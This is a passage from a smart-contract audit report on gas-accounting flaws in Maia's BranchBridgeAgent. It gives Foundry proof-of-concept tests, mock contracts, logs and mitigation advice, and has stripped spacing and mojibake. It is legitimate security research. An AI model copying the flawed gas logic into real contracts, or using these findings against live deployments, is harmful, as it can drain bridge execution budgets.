`ETHTransferFailed()`.mstore(0x00,0xb12d13eb)// Revert with (offset, size).revert(0x1c,0x04)}// Transfer the ETH and check if it succeeded or not.ifiszero(call(_GAS_STIPEND_NO_GRIEF,to,amount,0,0,0,0)) {mstore(0x00,to)// Store the address in scratch space.mstore8(0x0b,0x73)// Opcode `PUSH20`.mstore8(0x20,0xff)// Opcode `SELFDESTRUCT`.// We can directly use `SELFDESTRUCT` in the contract creation.// Compatible with `SENDALL`: https://eips.ethereum.org/EIPS/eip-4758ifiszero(create(amount,0x0b,0x16)) {// To coerce gas estimation to provide enough gas for the `create` above.ifiszero(gt(gas(),1000000)) {revert(0,0)}}}}}/// @dev Sends `amount` (in wei) ETH to `to`, with a `gasStipend`./// The `gasStipend` can be set to a low enough value to prevent/// storage writes or gas griefing.////// Simply use `gasleft()` for `gasStipend` if you don't need a gas stipend.////// Note: Does NOT revert upon failure./// Returns whether the transfer of ETH is successful instead.functiontrySafeTransferETH(addressto,uint256amount,uint256gasStipend)internalreturns(boolsuccess) {/// @solidity memory-safe-assemblyassembly{// Transfer the ETH and check if it succeeded or not.success :=call(gasStipend,to,amount,0,0,0,0)}}/*Â´:Â°â€¢.Â°+.*â€¢Â´.*:Ëš.Â°*.Ëšâ€¢Â´.Â°:Â°â€¢.Â°â€¢.*â€¢Â´.*:Ëš.Â°*.Ëšâ€¢Â´.Â°:Â°â€¢.Â°+.*â€¢Â´.*:*//-                    ERC20 OPERATIONS*//*.â€¢Â°:Â°.Â´+Ëš.*Â°.Ëš:*.Â´â€¢*.+Â°.â€¢Â°:Â´*.Â´â€¢*.â€¢Â°.â€¢Â°:Â°.Â´:â€¢ËšÂ°.*Â°.Ëš:*.Â´+Â°.â€¢*//// @dev Sends `amount` of ERC20 `token` from `from` to `to`./// Reverts upon failure.////// The `from` account must have at least `amount` approved for/// the current contract to manage.functionsafeTransferFrom(addresstoken,addressfrom,addressto,uint256amount)internal{/// @solidity memory-safe-assemblyassembly{letm:=mload(0x40)// Cache the free memory pointer.mstore(0x60,amount)// Store the `amount` argument.mstore(0x40,to)// Store the `to` argument.mstore(0x2c,shl(96,from))// Store the `from` argument.// Store the function selector of `transferFrom(address,address,uint256)`.mstore(0x0c,0x23b872dd000000000000000000000000)ifiszero(and(// The arguments of `and` are evaluated from right to left.// Set success to whether the call reverted, if not we check it either// returned exactly 1 (can't just be non-zero data), or had no return data.or(eq(mload(0x00),1),iszero(returndatasize())),call(gas(),token,0,0x1c,0x64,0x00,0x20))) {// Store the function selector of `TransferFromFailed()`.mstore(0x00,0x7939f424)// Revert with (offset, size).revert(0x1c,0x04)}mstore(0x60,0)// Restore the zero slot to zero.mstore(0x40,m)// Restore the free memory pointer.}}/// @dev Sends all of ERC20 `token` from `from` to `to`./// Reverts upon failure.////// The `from` account must have their entire balance approved for/// the current contract to manage.functionsafeTransferAllFrom(addresstoken,addressfrom,addressto)internalreturns(uint256amount) {/// @solidity memory-safe-assemblyassembly{letm:=mload(0x40)// Cache the free memory pointer.mstore(0x40,to)// Store the `to` argument.mstore(0x2c,shl(96,from))// Store the `from` argument.// Store the function selector of `balanceOf(address)`.mstore(0x0c,0x70a08231000000000000000000000000)ifiszero(and(// The arguments of `and` are evaluated from right to left.gt(returndatasize(),0x1f),// At least 32 bytes returned.staticcall(gas(),token,0x1c,0x24,0x60,0x20))) {// Store the function selector of `TransferFromFailed()`.mstore(0x00,0x7939f424)// Revert with (offset, size).revert(0x1c,0x04)}// Store the function selector of `transferFrom(address,address,uint256)`.mstore(0x00,0x23b872dd)// The `amount` argument is already written to the memory word at 0x60.amount :=mload(0x60)ifiszero(and(// The arguments of `and` are evaluated from right to left.// Set success to whether the call reverted, if not we check it either// returned exactly 1 (can't just be non-zero data), or had no return data.or(eq(mload(0x00),1),iszero(returndatasize())),call(gas(),token,0,0x1c,0x64,0x00,0x20))) {// Store the function selector of `TransferFromFailed()`.mstore(0x00,0x7939f424)// Revert with (offset, size).revert(0x1c,0x04)}mstore(0x60,0)// Restore the zero slot to zero.mstore(0x40,m)// Restore the free memory pointer.}}/// @dev Sends `amount` of ERC20 `token` from the current contract to `to`./// Reverts upon failure.functionsafeTransfer(addresstoken,addressto,uint256amount)internal{/// @solidity memory-safe-assemblyassembly{mstore(0x14,to)// Store the `to` argument.mstore(0x34,amount)// Store the `amount` argument.// Store the function selector of `transfer(address,uint256)`.mstore(0x00,0xa9059cbb000000000000000000000000)ifiszero(and(// The arguments of `and` are evaluated from right to left.// Set success to whether the call reverted, if not we check it either// returned exactly 1 (can't just be non-zero data), or had no return data.or(eq(mload(0x00),1),iszero(returndatasize())),call(gas(),token,0,0x10,0x44,0x00,0x20))) {// Store the function selector of `TransferFailed()`.mstore(0x00,0x90b8ec18)// Revert with (offset, size).revert(0x1c,0x04)}// Restore the part of the free memory pointer that was overwritten.mstore(0x34,0)}}/// @dev Sends all of ERC20 `token` from the current contract to `to`./// Reverts upon failure.functionsafeTransferAll(addresstoken,addressto)internalreturns(uint256amount) {/// @solidity memory-safe-assemblyassembly{mstore(0x00,0x70a08231)// Store the function selector of `balanceOf(address)`.mstore(0x20,address())// Store the address of the current contract.ifiszero(and(// The arguments of `and` are evaluated from right to left.gt(returndatasize(),0x1f),// At least 32 bytes returned.staticcall(gas(),token,0x1c,0x24,0x34,0x20))) {// Store the function selector of `TransferFailed()`.mstore(0x00,0x90b8ec18)// Revert with (offset, size).revert(0x1c,0x04)}mstore(0x14,to)// Store the `to` argument.// The `amount` argument is already written to the memory word at 0x34.amount :=mload(0x34)// Store the function selector of `transfer(address,uint256)`.mstore(0x00,0xa9059cbb000000000000000000000000)ifiszero(and(// The arguments of `and` are evaluated from right to left.// Set success to whether the call reverted, if not we check it either// returned exactly 1 (can't just be non-zero data), or had no return data.or(eq(mload(0x00),1),iszero(returndatasize())),call(gas(),token,0,0x10,0x44,0x00,0x20))) {// Store the function selector of `TransferFailed()`.mstore(0x00,0x90b8ec18)// Revert with (offset, size).revert(0x1c,0x04)}// Restore the part of the free memory pointer that was overwritten.mstore(0x34,0)}}/// @dev Sets `amount` of ERC20 `token` for `to` to manage on behalf of the current contract./// Reverts upon failure.functionsafeApprove(addresstoken,addressto,uint256amount)internal{/// @solidity memory-safe-assemblyassembly{mstore(0x14,to)// Store the `to` argument.mstore(0x34,amount)// Store the `amount` argument.// Store the function selector of `approve(address,uint256)`.mstore(0x00,0x095ea7b3000000000000000000000000)ifiszero(and(// The arguments of `and` are evaluated from right to left.// Set success to whether the call reverted, if not we check it either// returned exactly 1 (can't just be non-zero data), or had no return data.or(eq(mload(0x00),1),iszero(returndatasize())),call(gas(),token,0,0x10,0x44,0x00,0x20))) {// Store the function selector of `ApproveFailed()`.mstore(0x00,0x3e3f8f73)// Revert with (offset, size).revert(0x1c,0x04)}// Restore the part of the free memory pointer that was overwritten.mstore(0x34,0)}}/// @dev Returns the amount of ERC20 `token` owned by `account`./// Returns zero if the `token` does not exist.functionbalanceOf(addresstoken,addressaccount)internalviewreturns(uint256amount) {/// @solidity memory-safe-assemblyassembly{mstore(0x14,account)// Store the `account` argument.// Store the function selector of `balanceOf(address)`.mstore(0x00,0x70a08231000000000000000000000000)amount :=mul(mload(0x20),and(// The arguments of `and` are evaluated from right to left.gt(returndatasize(),0x1f),// At least 32 bytes returned.staticcall(gas(),token,0x10,0x24,0x20,0x20)))}}}interfaceIAnycallExecutor{functioncontext()externalviewreturns(addressfrom,uint256fromChainID,uint256nonce);functionexecute(address_to,bytescalldata_data,address_from,uint256_fromChainID,uint256_nonce,uint256_flags,bytescalldata_extdata)externalreturns(boolsuccess,bytesmemoryresult);}interfaceIAnycallConfig{functioncalcSrcFees(address_app,uint256_toChainID,uint256_dataLength)externalviewreturns(uint256);functionexecutionBudget(address_app)externalviewreturns(uint256);functiondeposit(address_account)externalpayable;functionwithdraw(uint256_amount)external;}interfaceIAnycallProxy{functionexecutor()externalviewreturns(address);functionconfig()externalviewreturns(address);functionanyCall(address_to,bytescalldata_data,uint256_toChainID,uint256_flags,bytescalldata_extdata)externalpayable;functionanyCall(stringcalldata_to,bytescalldata_data,uint256_toChainID,uint256_flags,bytescalldata_extdata)externalpayable;}contractWETH9{stringpublicname="Wrapped Ether";stringpublicsymbol="WETH";uint8publicdecimals=18;eventApproval(addressindexedsrc,addressindexedguy,uint256wad);eventTransfer(addressindexedsrc,addressindexeddst,uint256wad);eventDeposit(addressindexeddst,uint256wad);eventWithdrawal(addressindexedsrc,uint256wad);mapping(address=>uint256)publicbalanceOf;mapping(address=>mapping(address=>uint256))publicallowance;// function receive() external payable {//   deposit();// }functiondeposit()publicpayable{balanceOf[msg.sender] +=msg.value;emitDeposit(msg.sender,msg.value);}functionwithdraw(uint256wad)public{require(balanceOf[msg.sender] >=wad);balanceOf[msg.sender] -=wad;payable(msg.sender).transfer(wad);emitWithdrawal(msg.sender,wad);}functiontotalSupply()publicviewreturns(uint256) {returnaddress(this).balance;}functionapprove(addressguy,uint256wad)publicreturns(bool) {allowance[msg.sender][guy] =wad;emitApproval(msg.sender,guy,wad);returntrue;}functiontransfer(addressdst,uint256wad)publicreturns(bool) {returntransferFrom(msg.sender,dst,wad);}functiontransferFrom(addresssrc,addressdst,uint256wad)publicreturns(bool) {require(balanceOf[src] >=wad);if(src!=msg.sender&&allowance[src][msg.sender] !=255) {require(allowance[src][msg.sender] >=wad);allowance[src][msg.sender] -=wad;}balanceOf[src] -=wad;balanceOf[dst] +=wad;emitTransfer(src,dst,wad);returntrue;}}contractAnycallExecutor{structContext{addressfrom;uint256fromChainID;uint256nonce;}// Context public override context;Contextpubliccontext;constructor() {context.fromChainID=1;context.from=address(2);context.nonce=1;}}contractAnycallV7Config{eventDeposit(addressindexedaccount,uint256amount);mapping(address=>uint256)publicexecutionBudget;/// @notice Deposit native currency crediting `_account` for execution costs on this chain/// @param _account The account to deposit and credit forfunctiondeposit(address_account)externalpayable{executionBudget[_account] +=msg.value;emitDeposit(_account,msg.value);}}contractBranchBridgeAgent{errorAnycallUnauthorizedCaller();errorGasErrorOrRepeatedTx();uint256publicremoteCallDepositedGas;uint256internalconstantMIN_EXECUTION_OVERHEAD=160_000;// 100_000 for anycall + 35_000 Pre 1st Gas Checkpoint Execution + 25_000 Post last Gas Checkpoint Executionsuint256internalconstantTRANSFER_OVERHEAD=24_000;WETH9publicimmutablewrappedNativeToken;AnycallV7ConfigpublicanycallV7Config;uint256publicaccumulatedFees;/// @notice Local Chain Iduint24publicimmutablelocalChainId;/// @notice Address for Bridge Agent who processes requests submitted for the Root Router Address where cross-chain requests are executed in the Root Chain.addresspublicimmutablerootBridgeAgentAddress;/// @notice Local Anyexec Addressaddresspublicimmutablelocal`AnyCall`ExecutorAddress;/// @notice Address for Local AnycallV7 Proxy Address where cross-chain requests are sent to the Root Chain Router.addresspublicimmutablelocal`AnyCall`Address;constructor() {AnycallExecutoranycallExecutor=newAnycallExecutor();local`AnyCall`ExecutorAddress=address(anycallExecutor);localChainId=1;wrappedNativeToken=newWETH9();local`AnyCall`Address=address(3);rootBridgeAgentAddress=address(2);anycallV7Config=newAnycallV7Config();}modifierrequiresExecutor() {_requiresExecutor();_;}function_requiresExecutor()internalview{if(msg.sender!=local`AnyCall`ExecutorAddress)revertAnycallUnauthorizedCaller();(addressfrom, , ) =IAnycallExecutor(local`AnyCall`ExecutorAddress).context();if(from!=rootBridgeAgentAddress)revertAnycallUnauthorizedCaller();}function_replenishGas(uint256_executionGasSpent)internalvirtual{//Deposit GasanycallV7Config.deposit{value:_executionGasSpent}(address(this));// IAnycallConfig(IAnycallProxy(local`AnyCall`Address).config()).deposit{value: _executionGasSpent}(address(this));}function_forceRevert()internalvirtual{IAnycallConfiganycallConfig=IAnycallConfig(IAnycallProxy(local`AnyCall`Address).config());// uint256 executionBudget = anycallConfig.executionBudget(address(this));uint256executionBudget=anycallV7Config.executionBudget(address(this));// Withdraw all execution gas budget from anycall for tx to revert with "no enough budget"if(executionBudget>0)tryanycallConfig.withdraw(executionBudget) {}catch{}}/***@noticeInternal function repays gas used by Branch Bridge Agent to fulfill remote initiated interaction.-@param_recipientaddress to send excess gas to.-@param_initialGasgas used by Branch Bridge Agent.*/function_payExecutionGas(address_recipient,uint256_initialGas)internalvirtual{//Gas remaininguint256gasRemaining=wrappedNativeToken.balanceOf(address(this));//Unwrap GaswrappedNativeToken.withdraw(gasRemaining);//Delete Remote Initiated Action Statedelete(remoteCallDepositedGas);///Save gas leftuint256gasLeft=gasleft();//Get Branch Environment Execution Cost// Assume tx.gasPrice 1e9uint256minExecCost=1e9*(MIN_EXECUTION_OVERHEAD+_initialGas-gasLeft);//Check if sufficient balanceif(minExecCost>gasRemaining) {_forceRevert();return;}//Replenish Gas_replenishGas(minExecCost);//Transfer gas remaining to recipientSafeTransferLib.safeTransferETH(_recipient,gasRemaining-minExecCost);//Save Gasuint256gasAfterTransfer=gasleft();//Check if sufficient balance // This condition is always trueif(gasLeft-gasAfterTransfer>TRANSFER_OVERHEAD) {console.log("(gasLeft - gasAfterTransfer > TRANSFER_OVERHEAD) => true");console.log("gasLeft - gasAfterTransfer = %d - %d = %d",gasLeft,gasAfterTransfer,gasLeft-gasAfterTransfer);_forceRevert();return;}}functionanyExecute(bytesmemorydata)publicvirtualrequiresExecutorreturns(boolsuccess,bytesmemoryresult){//Get Initial Gas Checkpointuint256initialGas=gasleft();//Action Recipientaddressrecipient=address(0x0);// for simplicity and since it is irrelevant //address(uint160(bytes20(data[PARAMS_START:PARAMS_START_SIGNED])));// Other Code Here//Deduct gas costs from deposit and replenish this bridge agent's execution budget._payExecutionGas(recipient,initialGas);}functiondepositIntoWeth(uint256amt)external{wrappedNativeToken.deposit{value:amt}();}fallback()externalpayable{}}contractGasCalcTransferOverHeadisDSTest,Test{BranchBridgeAgentbranchBridgeAgent;functionsetUp()public{branchBridgeAgent=newBranchBridgeAgent();vm.deal(address(branchBridgeAgent.local`AnyCall`ExecutorAddress()),100ether);// executer pays gasvm.deal(address(branchBridgeAgent),100ether);}functiontest_anyexecute_always_revert_bc_transfer_overhead()public{// add weth balancebranchBridgeAgent.depositIntoWeth(100ether);vm.prank(address(branchBridgeAgent.local`AnyCall`ExecutorAddress()));vm.expectRevert();branchBridgeAgent.anyExecute{gas:1ether}(bytes(""));vm.stopPrank();}}
Recommended Mitigation Steps
Increase theTRANSFER_OVERHEADto cover the actual gas spent. You could also add a gas checkpoint immediately before the transfer to make the naming makes sense (i.e.TRANSFER_OVERHEAD). However, the gas will be nearly34_378, which is still higher thanTRANSFER_OVERHEAD(24_000).
You can simply comment out the code aftergasLefttill the transfer, by removing_minExecCostfrom the value to transfer since it is commented out. Now, when you run the test again, you will see an output like this (with a failed test but we are not interested in it anyway):
[FAIL.Reason:Calldidnotrevertasexpected]test_anyexecute_always_revert_bc_transfer_overhead() (gas:111185)Logs:(gasLeft-gasAfterTransfer>TRANSFER_OVERHEAD)=>truegasLeft-gasAfterTransfer=999999999999979606-999999999999945228=34378Testresult:FAILED.0passed;1failed;finishedin1.26ms
gasLeft-gasAfterTransfer= 34378
Please note that I have tested a simple function in Remix as well and it gave the same gas spent (i.e. 34378):
// copy the library code from Solady and paste it here// https://github.com/Vectorized/solady/blob/main/src/utils/SafeTransferLib.solcontract Test {function testGas() payable public returns (uint256){///Save gas leftuint256 gasLeft = gasleft();//Transfer gas remaining to recipientSafeTransferLib.safeTransferETH(address(0), 1 ether);//Save Gasuint256 gasAfterTransfer = gasleft();return gasLeft-gasAfterTransfer;}}
The returned value will be 34378.
0xBugsy (Maia) confirmed and commented:
We recognize the audit’s findings on Anycall Gas Management. These will not be rectified due to the upcoming migration of this section to LayerZero.

[H-16] Overpaying remaining gas to the user for failinganyExecutecall due to an incorrect gas unit calculation inBranchBridgeAgent
Submitted byKoolex, also found byKoolex
TheanyExecutemethod is called by theAnycall Executoron the destination chain to execute interaction. The user has to pay for the remote callExecutionGas; this is done at the end of the call. However, if there is not enoughgasRemaining, theanyExecutewill be reverted due to a revert caused by theAnycall Executor.
Here is the calculation for the gas used:
///Save gas leftuint256gasLeft=gasleft();//Get Branch Environment Execution Costuint256minExecCost=tx.gasprice* (MIN_EXECUTION_OVERHEAD+_initialGas-gasLeft);//Check if sufficient balanceif(minExecCost>gasRemaining) {_forceRevert();return;}
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1018-L1054
_forceRevertwill withdraw all of the execution budget:
// Withdraw all execution gas budget from anycall for tx to revert with "no enough budget"if (executionBudget > 0) try anycallConfig.withdraw(executionBudget) {} catch {}
SoAnycall Executorwill revert if there is not enough budget. This is done at:
uint256budget=executionBudget[_from];require(budget>totalCost,"no enough budget");executionBudget[_from] =budget-totalCost;
https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Config.sol#L206C42-L206C58
(1) Gas Calculation:
To calculate how much the user has to pay, the following formula is used:
//Get Branch Environment Execution Costuint256minExecCost=tx.gasprice* (MIN_EXECUTION_OVERHEAD+_initialGas-gasLeft);
Gas units are calculated as follows:
Storegasleft()atinitialGasat the beginning ofanyExecutemethod:
//Get Initial Gas Checkpointuint256initialGas=gasleft();
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1125
Nearly at the end of the method, deductgasleft()frominitialGas. This covers everything between the initial gas checkpoint and the end gas checkpoint.
///Save gas leftuint256gasLeft=gasleft();//Get Branch Environment Execution Costuint256minExecCost=tx.gasprice* (MIN_EXECUTION_OVERHEAD+_initialGas-gasLeft);
AddMIN_EXECUTION_OVERHEADwhich is160_000.
uint256 internal constant MIN_EXECUTION_OVERHEAD = 160_000; // 100_000 for anycall + 35_000 Pre 1st Gas Checkpoint Execution + 25_000 Post last Gas Checkpoint Executions
This overhead is supposed to cover:
100_000foranycall. This is an extra cost required byAnycall:
Line:38uint256constantEXECUTION_OVERHEAD=100000;..Line:203uint256gasUsed=_prevGasLeft+EXECUTION_OVERHEAD-gasleft();
https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Config.sol#L203
35_000Pre-First Gas Checkpoint Execution. For example, to cover the modifierrequiresExecutor.25_000Post-Last Gas Checkpoint Execution. To cover everything after the end gas checkpoint:
//Get Branch Environment Execution Costuint256minExecCost=tx.gasprice* (MIN_EXECUTION_OVERHEAD+_initialGas-gasLeft);//Check if sufficient balanceif(minExecCost>gasRemaining) {_forceRevert();return;}//Replenish Gas_replenishGas(minExecCost);//Transfer gas remaining to recipientSafeTransferLib.safeTransferETH(_recipient,gasRemaining-minExecCost);//Save Gasuint256gasAfterTransfer=gasleft();//Check if sufficient balanceif(gasLeft-gasAfterTransfer>TRANSFER_OVERHEAD) {_forceRevert();return;}
The issue is,60_000is not enough to cover pre-first gas checkpoint and post-last gas checkpoint. This means, that the user is paying less than the actual gas cost. According to the sponsor, theBridge Agentdeployer deposits the first time intoanycallConfig, where the goal is to replenish the execution budget after use every time. The issue could possibly lead to:
Overpaying the remaining gas the user.The execution budget is decreasing over time (slow draining) in case it has funds already.TheanyExecutecalls will fail since the calculation of the gas used in theAnycallcontracts is way bigger. InAnycall, this is done by the modifierchargeDestFee:modifierchargeDestFee:modifierchargeDestFee(address_from,uint256_flags) {if(_isSet(_flags,AnycallFlags.FLAG_PAY_FEE_ON_DEST)) {uint256_prevGasLeft=gasleft();_;IAnycallConfig(config).chargeFeeOnDestChain(_from,_prevGasLeft);}else{_;}}https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Upgradeable.sol#L163-L171functionchargeFeeOnDestChain:functionchargeFeeOnDestChain(address_from,uint256_prevGasLeft)externalonlyAnycallContract{if(!_isSet(mode,FREE_MODE)) {uint256gasUsed=_prevGasLeft+EXECUTION_OVERHEAD-gasleft();uint256totalCost=gasUsed* (tx.gasprice+_feeData.premium);uint256budget=executionBudget[_from];require(budget>totalCost,"no enough budget");executionBudget[_from] =budget-totalCost;_feeData.accruedFees+=uint128(totalCost);}}https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Config.sol#L203
(2) Gas Calculation inAnyCall:
There is also a gas consumption at theanyExecmethod called by the MPC (inAnyCall) here:
functionanyExec(address_to,bytescalldata_data,stringcalldata_appID,RequestContextcalldata_ctx,bytescalldata_extdata)externalvirtuallockwhenNotPausedchargeDestFee(_to, _ctx.flags)// <= starting from hereonlyMPC{...boolsuccess=_execute(_to,_data,_ctx,_extdata);..}
https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Upgradeable.sol#L276
The gas is nearly110_000. It is not taken into account.
(3) Base Fee & Input Data Fee:
FromEthereum yellow paper:
Gtransaction 21000 - Paid for every transaction.Gtxdatazero 4 - Paid for every zero byte of data or code for a transaction.Gtxdatanonzero 16 - Paid for every non-zero byte of data or code for a transaction.
So:
We have21_000as a base fee. This should be taken into account. However, it is paid byAnyCall, since the TX is sent by MPC. So, we are fine here. This probably explains the overhead (100_000) added byanycall.Because theanyExecutemethod has bytes data to be passed, we have extra gas consumption which is not taken into account.
For every zero byte=>4.
For every non-zero byte=>16.
So generally speaking, the bigger the data is, the bigger the gas becomes. You can simply prove this by adding arbitrary data to theanyExecutemethod in PoC #1 test below and you will see the gas spent increases.
Summary
MIN_EXECUTION_OVERHEADis underestimated.The gas consumed by theanyExecmethod called by the MPC is not considered.Input data fee isn’t taken into account.
There are two PoCs proving the first two points above. The third point can be proven by simply adding arbitrary data to theanyExecutemethod in PoC #1 test.
Proof of Concept
PoC #1 (MIN_EXECUTION_OVERHEADis underestimated):
This PoC is independent from the codebase (but uses the same code). There are two contracts simulatingBranchBridgeAgent.anyExecute:
BranchBridgeAgent- which has the code of the pre-first gas checkpoint and the post-last gas checkpoint.BranchBridgeAgentEmpty- which has the code of the pre-first gas checkpoint and the post-last gas checkpointcommented out.
We run the same test for both, the difference in gas is what’s at least nearly the minimum required to cover the pre-first gas checkpoint and the post-last gas checkpoint. In this case here it is78097which is bigger than60_000.
Here is the output of the test:
[PASS]test_calcgas() (gas: 119050)Logs:branchBridgeAgent.anyExecute Gas Spent => 92852[PASS]test_calcgasEmpty() (gas: 44461)Logs:branchBridgeAgentEmpty.anyExecute Gas Spent => 14755
92852 - 14755= 78097
Explanation
BranchBridgeAgent.anyExecutemethod depends on the following external calls:
AnycallExecutor.context()AnycallProxy.config()AnycallConfig.executionBudget()AnycallConfig.withdraw()AnycallConfig.deposit()WETH9.withdraw()
For this reason, I’ve copied the same code frommultichain-smart-contracts. For WETH9, I’ve used the contract from the codebase which has minimal code.
Please note that:
tx.gaspriceis replaced with a fixed value in the_payExecutionGasmethod, as it is not available in Foundry.In_replenishGas, reading the config viaIAnycallProxy(localAnyCallAddress).config()is replaced with an immediate call for simplicity. In other words, avoiding a proxy to make the PoC simpler and shorter. However, if done with a proxy the gas used would increase. So in both ways, it is in favor of the PoC.The conditionif (gasLeft - gasAfterTransfer > TRANSFER_OVERHEAD)is replaced withif (gasLeft - gasAfterTransfer > TRANSFER_OVERHEAD && false). This is to avoid entering theforceRevert. The increase of gas here is negligible.
The coded PoC
Foundry.toml
[profile.default]solc ='0.8.17'src ='solidity'test='solidity/test'out ='out'libs = ['lib']fuzz_runs = 1000optimizer_runs = 10_000
.gitmodules
[submodule"lib/ds-test"]path = lib/ds-testurl = https://github.com/dapphub/ds-testbranch = master[submodule"lib/forge-std"]path = lib/forge-stdurl = https://github.com/brockelmore/forge-stdbranch = master
remappings.txt
ds-test/=lib/ds-test/srcforge-std/=lib/forge-std/src
Test File:
// PoC => Maia OmniChain: gasCalculation in BranchBridgeAgentpragmasolidity>=0.8.4<0.9.0;import{Test}from"forge-std/Test.sol";import"forge-std/console.sol";import{DSTest}from"ds-test/test.sol";librarySafeTransferLib{/*Â´:Â°â€¢.Â°+.*â€¢Â´.*:Ëš.Â°*.Ëšâ€¢Â´.Â°:Â°â€¢.Â°â€¢.*â€¢Â´.*:Ëš.Â°*.Ëšâ€¢Â´.Â°:Â°â€¢.Â°+.*â€¢Â´.*:*//-                     CUSTOM ERRORS*//*.â€¢Â°:Â°.Â´+Ëš.*Â°.Ëš:*.Â´â€¢*.+Â°.â€¢Â°:Â´*.Â´â€¢*.â€¢Â°.â€¢Â°:Â°.Â´:â€¢ËšÂ°.*Â°.Ëš:*.Â´+Â°.â€¢*//// @dev The ETH transfer has failed.errorETHTransferFailed();/// @dev The ERC20 `transferFrom` has failed.errorTransferFromFailed();/// @dev The ERC20 `transfer` has failed.errorTransferFailed();/// @dev The ERC20 `approve` has failed.errorApproveFailed();/*Â´:Â°â€¢.Â°+.*â€¢Â´.*:Ëš.Â°*.Ëšâ€¢Â´.Â°:Â°â€¢.Â°â€¢.*â€¢Â´.*:Ëš.Â°*.Ëšâ€¢Â´.Â°:Â°â€¢.Â°+.*â€¢Â´.*:*//-                       CONSTANTS*//*.â€¢Â°:Â°.Â´+Ëš.*Â°.Ëš:*.Â´â€¢*.+Â°.â€¢Â°:Â´*.Â´â€¢*.â€¢Â°.â€¢Â°:Â°.Â´:â€¢ËšÂ°.*Â°.Ëš:*.Â´+Â°.â€¢*//// @dev Suggested gas stipend for contract receiving ETH/// that disallows any storage writes.uint256internalconstant_GAS_STIPEND_NO_STORAGE_WRITES=2300;/// @dev Suggested gas stipend for contract receiving ETH to perform a few/// storage reads and writes, but low enough to prevent griefing./// Multiply by a small constant (e.g. 2), if needed.uint256internalconstant_GAS_STIPEND_NO_GRIEF=100000;/*Â´:Â°â€¢.Â°+.*â€¢Â´.*:Ëš.Â°*.Ëšâ€¢Â´.Â°:Â°â€¢.Â°â€¢.*â€¢Â´.*:Ëš.Â°*.Ëšâ€¢Â´.Â°:Â°â€¢.Â°+.*â€¢Â´.*:*//-                     ETH OPERATIONS*//*.â€¢Â°:Â°.Â´+Ëš.*Â°.Ëš:*.Â´â€¢*.+Â°.â€¢Â°:Â´*.Â´â€¢*.â€¢Â°.â€¢Â°:Â°.Â´:â€¢ËšÂ°.*Â°.Ëš:*.Â´+Â°.â€¢*//// @dev Sends `amount` (in wei) ETH to `to`./// Reverts upon failure.////// Note: This implementation does NOT protect against gas griefing./// Please use `forceSafeTransferETH` for gas griefing protection.functionsafeTransferETH(addressto,uint256amount)internal{/// @solidity memory-safe-assemblyassembly{// Transfer the ETH and check if it succeeded or not.ifiszero(call(gas(),to,amount,0,0,0,0)) {// Store the function selector of `ETHTransferFailed()`.mstore(0x00,0xb12d13eb)// Revert with (offset, size).revert(0x1c,0x04)}}}/// @dev Force sends `amount` (in wei) ETH to `to`, with a `gasStipend`./// The `gasStipend` can be set to a low enough value to prevent/// storage writes or gas griefing.////// If sending via the normal procedure fails, force sends the ETH by/// creating a temporary contract which uses `SELFDESTRUCT` to force send the ETH.////// Reverts if the current contract has insufficient balance.functionforceSafeTransferETH(addressto,uint256amount,uint256gasStipend)internal{/// @solidity memory-safe-assemblyassembly{// If insufficient balance, revert.iflt(selfbalance(),amount) {// Store the function selector of `ETHTransferFailed()`.mstore(0x00,0xb12d13eb)// Revert with (offset, size).revert(0x1c,0x04)}// Transfer the ETH and check if it succeeded or not.ifiszero(call(gasStipend,to,amount,0,0,0,0)) {mstore(0x00,to)// Store the address in scratch space.mstore8(0x0b,0x73)// Opcode `PUSH20`.mstore8(0x20,0xff)// Opcode `SELFDESTRUCT`.// We can directly use `SELFDESTRUCT` in the contract creation.// Compatible with `SENDALL`: https://eips.ethereum.org/EIPS/eip-4758ifiszero(create(amount,0x0b,0x16)) {// To coerce gas estimation to provide enough gas for the `create` above.ifiszero(gt(gas(),1000000)) {revert(0,0) }}}}}/// @dev Force sends `amount` (in wei) ETH to `to`, with a gas stipend/// equal to `_GAS_STIPEND_NO_GRIEF`. This gas stipend is a reasonable default/// for 99% of cases and can be overridden with the three-argument version of this/// function if necessary.////// If sending via the normal procedure fails, force sends the ETH by/// creating a temporary contract which uses `SELFDESTRUCT` to force send the ETH.////// Reverts if the current contract has insufficient balance.functionforceSafeTransferETH(addressto,uint256amount)internal{// Manually inlined because the compiler doesn't inline functions with branches./// @solidity memory-safe-assemblyassembly{// If insufficient balance, revert.iflt(selfbalance(),amount) {// Store the function selector of `ETHTransferFailed()`.mstore(0x00,0xb12d13eb)// Revert with (offset, size).revert(0x1c,0x04)}// Transfer the ETH and check if it succeeded or not.ifiszero(call(_GAS_STIPEND_NO_GRIEF,to,amount,0,0,0,0)) {mstore(0x00,to)// Store the address in scratch space.mstore8(0x0b,0x73)// Opcode `PUSH20`.mstore8(0x20,0xff)// Opcode `SELFDESTRUCT`.// We can directly use `SELFDESTRUCT` in the contract creation.// Compatible with `SENDALL`: https://eips.ethereum.org/EIPS/eip-4758ifiszero(create(amount,0x0b,0x16)) {// To coerce gas estimation to provide enough gas for the `create` above.ifiszero(gt(gas(),1000000)) {revert(0,0) }}}}}/// @dev Sends `amount` (in wei) ETH to `to`, with a `gasStipend`./// The `gasStipend` can be set to a low enough value to prevent/// storage writes or gas griefing.////// Simply use `gasleft()` for `gasStipend` if you don't need a gas stipend.////// Note: Does NOT revert upon failure./// Returns whether the transfer of ETH is successful instead.functiontrySafeTransferETH(addressto,uint256amount,uint256gasStipend)internalreturns(boolsuccess){/// @solidity memory-safe-assemblyassembly{// Transfer the ETH and check if it succeeded or not.success :=call(gasStipend,to,amount,0,0,0,0)}}/*Â´:Â°â€¢.Â°+.*â€¢Â´.*:Ëš.Â°*.Ëšâ€¢Â´.Â°:Â°â€¢.Â°â€¢.*â€¢Â´.*:Ëš.Â°*.Ëšâ€¢Â´.Â°:Â°â€¢.Â°+.*â€¢Â´.*:*//-                    ERC20 